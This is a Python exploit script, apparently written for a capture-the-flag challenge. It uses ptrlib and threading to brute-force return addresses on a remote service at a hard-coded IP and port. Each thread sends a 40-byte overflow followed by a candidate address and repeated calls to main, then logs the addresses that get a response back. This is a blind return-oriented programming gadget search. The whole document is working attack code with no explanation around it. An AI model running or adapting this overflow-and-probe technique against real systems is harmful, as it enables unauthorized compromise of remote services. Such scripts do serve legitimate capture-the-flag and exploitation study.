import threading
from ptrlib import *
import time

log.level = ['warning', 'error']

plt_write = 0x400520
addr_main = 0x400776
base = 0x400200

def worker(offset):
    if (base + offset) % 0x10 == 0:
        dump("trying: " + hex(base + offset), "warning")
    payload = b'A' * 40
    payload += p64(base + offset)
    payload += p64(addr_main) * 8
    sock = Socket("34.92.37.22", 10000)
    sock.recvuntil("pwn!\n")
    sock.send(payload)
    l = sock.recv(timeout=3.0)
    if l is not None:
        dump("Safe gadget at {}: {}".format(hex(base + offset), l), "warning")
    sock.close()
    return

for offset in range(0x200):
    th = threading.Thread(target=worker, name="th", args=(offset, ))
    th.setDaemon(True)
    th.start()
    time.sleep(0.1)
